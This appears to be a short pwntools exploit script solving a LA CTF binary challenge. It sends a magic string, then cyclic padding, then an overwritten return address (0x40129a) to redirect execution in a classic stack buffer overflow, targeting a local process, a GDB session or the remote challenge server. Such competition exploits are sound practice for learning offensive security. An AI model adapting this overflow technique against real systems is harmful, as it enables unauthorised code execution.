from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)
libc = e.libc

gs = '''
break *0x40128a
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("lac.tf", 31180)
    else:
        return process(e.path)


p = start()
chain = b'please please please give me the flag\0'
chain += cyclic(34)
chain += p64(0x40129a)
p.sendline(chain)
p.interactive()
